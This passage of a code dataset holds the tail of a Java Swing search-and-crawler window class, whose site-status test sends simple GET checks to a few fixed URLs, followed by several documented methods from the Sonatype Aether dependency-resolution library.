\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttxtDtestjson,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addPreferredGap(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tComponentPlacement.RELATED))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox_2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(2))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcheckBox_1)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(1)))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.BASELINE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttxtDtestindex,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_3)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbutton,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(7)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcomboBox,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(10)))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(15)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_5)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(19)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tscrollPane,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t274,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE))\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(62)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_1\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.BASELINE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_3,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_4))))\n\t\t\t\t\t\t\t\t\t.addContainerGap()));\n\n\ttextArea_1 = new JTextArea();\n\ttextArea_1.setLineWrap(true);\n\ttextArea_1.setEditable(false);\n\tscrollPane.setViewportView(textArea_1);\n\tpanel_1.setLayout(gl_panel_1);\n\n\t// button.setAction(action);\n\n\tJPanel panel_2 = new JPanel();\n\ttabbedPane.addTab(\"\u7ad9\u70b9\u6d4b\u8bd5\", null, panel_2, null);\n\n\tJButton button_1 = new JButton(\"\u6d4b\u8bd5\");\n\n\tJScrollPane scrollPane_1 = new JScrollPane();\n\tGroupLayout gl_panel_2 = new GroupLayout(panel_2);\n\tgl_panel_2\n\t\t\t.setHorizontalGroup(gl_panel_2\n\t\t\t\t\t.createParallelGroup(Alignment.LEADING)\n\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\tgl_panel_2\n\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_2\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tscrollPane_1,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t737,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShort.MAX_VALUE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_2\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(337)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbutton_1)))\n\t\t\t\t\t\t\t\t\t.addContainerGap()));\n\tgl_panel_2.setVerticalGroup(gl_panel_2.createParallelGroup(\n\t\t\tAlignment.LEADING).addGroup(\n\t\t\tgl_panel_2\n\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t.addGap(22)\n\t\t\t\t\t.addComponent(button_1)\n\t\t\t\t\t.addGap(18)\n\t\t\t\t\t.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t343, Short.MAX_VALUE)));\n\n\tfinal JTextArea textArea = new JTextArea();\n\tscrollPane_1.setViewportView(textArea);\n\tbutton_1.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent arg0) {\n\t\t\tThread t = new Thread(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\tString url[] = { \"http://202.206.64.193\",\n\t\t\t\t\t\t\t\"http://202.206.64.193/caifeng\",\n\t\t\t\t\t\t\t\"http://202.206.64.193/blog\",\n\t\t\t\t\t\t\t\"http://202.206.64.193/phpMyAdmin\" };\n\t\t\t\t\ttextArea.append(\"\u6d4b\u8bd5\u65f6\u95f4\"\n\t\t\t\t\t\t\t+ new Date(System.currentTimeMillis()).toLocaleString()\n\t\t\t\t\t\t\t+ \"\\n\");\n\t\t\t\t\tfor (int i = 0; i < url.length; i++) {\n\t\t\t\t\t\tHttpClient hc = new HttpClient();\n\t\t\t\t\t\tGetMethod get;\n\t\t\t\t\t\thc.setConnectionTimeout(5000);\n\t\t\t\t\t\tget = new GetMethod(url[i]);\n\t\t\t\t\t\tint status = 0;\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tstatus = hc.executeMethod(get);\n\t\t\t\t\t\t} catch (HttpException e) {\n\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\ttextArea.append(\"\u7ad9\u70b9\uff1a\" + url[i] + \"\\n\u72b6\u6001\u7801\uff1a\" + status\n\t\t\t\t\t\t\t\t\t+ \"\\n\" + (status == 200 ? \"\u6b63\u5e38\" : \"\u5931\u8d25\")\n\t\t\t\t\t\t\t\t\t+ \"\\n=========\\n\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tget.releaseConnection();\n\t\t\t\t\t\ttextArea.paintImmediately(textArea.getBounds());\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t\tt.start();\n\t\t}\n\t});\n\tpanel_2.setLayout(gl_panel_2);\n\n\tJPanel panel_3 = new JPanel();\n\ttabbedPane.addTab(\"Index\", null, panel_3, null);\n\n\ttextField_1 = new JTextField();\n\ttextField_1.setColumns(10);\n\n\ttextField_2 = new JTextField();\n\ttextField_2.setColumns(10);\n\tfinal JLabel lblNewLabel_2 = new JLabel(\"\u8bf7\u7a0d\u5019\");\n\tJButton btnNewButton = new JButton(\"New button\");\n\tbtnNewButton.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent arg0) {\n\t\t\tIndexer i = new Indexer();\n\t\t\ti.index(textField_2.getText(), textField_1.getText());\n\t\t\tlblNewLabel_2.setText(\"Finish\");\n\t\t}\n\t});\n\n\tJLabel lblNewLabel_1 = new JLabel(\"json\");\n\n\tJLabel lblIndex = new JLabel(\"index\");\n\n\tGroupLayout gl_panel_3 = new GroupLayout(panel_3);\n\tgl_panel_3\n\t\t\t.setHorizontalGroup(gl_panel_3\n\t\t\t\t\t.createParallelGroup(Alignment.LEADING)\n\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(197)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_1)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblIndex))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(43)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_2,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_1,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)))\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGap(282)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.LEADING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbtnNewButton))))\n\t\t\t\t\t\t\t\t\t.addContainerGap(372, Short.MAX_VALUE)));\n\tgl_panel_3\n\t\t\t.setVerticalGroup(gl_panel_3\n\t\t\t\t\t.createParallelGroup(Alignment.LEADING)\n\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t.createSequentialGroup()\n\t\t\t\t\t\t\t\t\t.addGap(34)\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.BASELINE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_1,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlblNewLabel_1))\n\t\t\t\t\t\t\t\t\t.addGap(33)\n\t\t\t\t\t\t\t\t\t.addGroup(\n\t\t\t\t\t\t\t\t\t\t\tgl_panel_3\n\t\t\t\t\t\t\t\t\t\t\t\t\t.createParallelGroup(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAlignment.TRAILING)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttextField_2,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.DEFAULT_SIZE,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tGroupLayout.PREFERRED_SIZE)\n\t\t\t\t\t\t\t\t\t\t\t\t\t.addComponent(lblIndex))\n\t\t\t\t\t\t\t\t\t.addGap(37).addComponent(btnNewButton)\n\t\t\t\t\t\t\t\t\t.addGap(28).addComponent(lblNewLabel_2)\n\t\t\t\t\t\t\t\t\t.addContainerGap(194, Short.MAX_VALUE)));\n\tpanel_3.setLayout(gl_panel_3);\n\tbutton.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\tlblNewLabel_5.setText(\"\u8bf7\u7a0d\u5019\");\n\t\t\tThread t = new Thread(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\tlong start = System.currentTimeMillis();\n\t\t\t\t\tSearcher s = new Searcher(txtDtestjson.getText(), txtDtestindex\n\t\t\t\t\t\t\t.getText());\n\t\t\t\t\tLinkedList<Hit> list = s.search(textField.getText(),\n\t\t\t\t\t\t\tcheckBox_1.isSelected(),\n\t\t\t\t\t\t\tInteger.parseInt(textField_3.getText()));\n\t\t\t\t\tString re = \"\";\n\t\t\t\t\tfor (Hit h : list) {\n\t\t\t\t\t\tPagePOJO pojo = h.getPagePOJO();\n\t\t\t\t\t\tre += pojo.title + \"\\n\";\n\t\t\t\t\t\tif (checkBox.isSelected()) {\n\t\t\t\t\t\t\tre += pojo.content\n\t\t\t\t\t\t\t\t\t+ \"\\n====================================\\n\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (re.equals(\"\"))\n\t\t\t\t\t\tre = \"\u627e\u4e0d\u5230\" + textField.getText();\n\t\t\t\t\ttextArea_1.setText(re);\n\t\t\t\t\tif (checkBox_2.isSelected()) {\n\t\t\t\t\t\tList<PagePOJO> l = new LinkedList<PagePOJO>();\n\t\t\t\t\t\twhile (!list.isEmpty()) {\n\t\t\t\t\t\t\tl.add(list.pop().getPagePOJO());\n\t\t\t\t\t\t}\n\t\t\t\t\t\tclusterResult = null;\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tclusterResult = new Cluster().cluster(l);\n\t\t\t\t\t\t} catch (IOException e1) {\n\t\t\t\t\t\t\te1.printStackTrace();\n\t\t\t\t\t\t} catch (Exception e1) {\n\t\t\t\t\t\t\te1.printStackTrace();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tIterator<String> it = clusterResult.keySet().iterator();\n\t\t\t\t\t\tcomboBox.removeAllItems();\n\t\t\t\t\t\twhile (it.hasNext()) {\n\t\t\t\t\t\t\tcomboBox.addItem(it.next());\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tlblNewLabel_5.setText(\"\u672c\u6b21\u641c\u7d22\u7528\u65f6\"\n\t\t\t\t\t\t\t+ (System.currentTimeMillis() - start) + \"\u6beb\u79d2\");\n\t\t\t\t}\n\t\t\t});\n\t\t\tt.start();\n\t\t}\n\t});\n\n}", "path": "windowsearcher\\com\\gs\\window\\Main.java", "repo_name": "gsh199449/DistributeCrawler", "stars": 72, "license": "None", "language": "java", "size": 3629}
{"docstring": "/**\n * Sets the optional flag for the dependency.\n * \n * @param optional {@code true} if the dependency is optional, {@code false} if the dependency is mandatory.\n * @return The new dependency, never {@code null}.\n */\n", "func_signal": "public Dependency setOptional( boolean optional )", "code": "{\n    if ( this.optional == optional )\n    {\n        return this;\n    }\n    return new Dependency( artifact, scope, exclusions, optional );\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\graph\\Dependency.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the context in which this request is made.\n * \n * @param context The context, may be {@code null}.\n * @return This request for chaining, never {@code null}.\n */\n", "func_signal": "public VersionRequest setRequestContext( String context )", "code": "{\n    this.context = ( context != null ) ? context : \"\";\n    return this;\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new workspace reader by chaining the specified readers.\n * \n * @param readers The readers to chain, may be {@code null}.\n * @see #newInstance(WorkspaceReader, WorkspaceReader)\n */\n", "func_signal": "public ChainedWorkspaceReader( WorkspaceReader... readers )", "code": "{\n    if ( readers != null )\n    {\n        Collections.addAll( this.readers, readers );\n    }\n\n    StringBuilder buffer = new StringBuilder();\n    for ( WorkspaceReader reader : readers )\n    {\n        if ( buffer.length() > 0 )\n        {\n            buffer.append( '+' );\n        }\n        buffer.append( reader.getRepository().getContentType() );\n    }\n\n    repository = new WorkspaceRepository( buffer.toString(), new Key( this.readers ) );\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\repository\\ChainedWorkspaceReader.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new service locator that already knows about all service implementations included this library.\n */\n", "func_signal": "public DefaultServiceLocator()", "code": "{\n    classes = new HashMap<Class<?>, Collection<Class<?>>>();\n    instances = new HashMap<Class<?>, List<?>>();\n\n    addService( RepositorySystem.class, DefaultRepositorySystem.class );\n    addService( ArtifactResolver.class, DefaultArtifactResolver.class );\n    addService( DependencyCollector.class, DefaultDependencyCollector.class );\n    addService( Deployer.class, DefaultDeployer.class );\n    addService( Installer.class, DefaultInstaller.class );\n    addService( MetadataResolver.class, DefaultMetadataResolver.class );\n    addService( RemoteRepositoryManager.class, DefaultRemoteRepositoryManager.class );\n    addService( UpdateCheckManager.class, DefaultUpdateCheckManager.class );\n    addService( FileProcessor.class, DefaultFileProcessor.class );\n    addService( SyncContextFactory.class, DefaultSyncContextFactory.class );\n    addService( RepositoryEventDispatcher.class, DefaultRepositoryEventDispatcher.class );\n    addService( LocalRepositoryProvider.class, DefaultLocalRepositoryProvider.class );\n    addService( LocalRepositoryManagerFactory.class, SimpleLocalRepositoryManagerFactory.class );\n    addService( LocalRepositoryManagerFactory.class, EnhancedLocalRepositoryManagerFactory.class );\n}", "path": "aether-impl\\src\\main\\java\\org\\sonatype\\aether\\impl\\internal\\DefaultServiceLocator.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the artifact being depended on.\n * \n * @param artifact The artifact, must not be {@code null}.\n * @return The new dependency, never {@code null}.\n */\n", "func_signal": "public Dependency setArtifact( Artifact artifact )", "code": "{\n    if ( this.artifact.equals( artifact ) )\n    {\n        return this;\n    }\n    return new Dependency( artifact, scope, exclusions, optional );\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\graph\\Dependency.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the trace information that describes the higher level request/operation in which this request is issued.\n * \n * @param trace The trace information about the higher level operation, may be {@code null}.\n * @return This request for chaining, never {@code null}.\n */\n", "func_signal": "public VersionRequest setTrace( RequestTrace trace )", "code": "{\n    this.trace = trace;\n    return this;\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
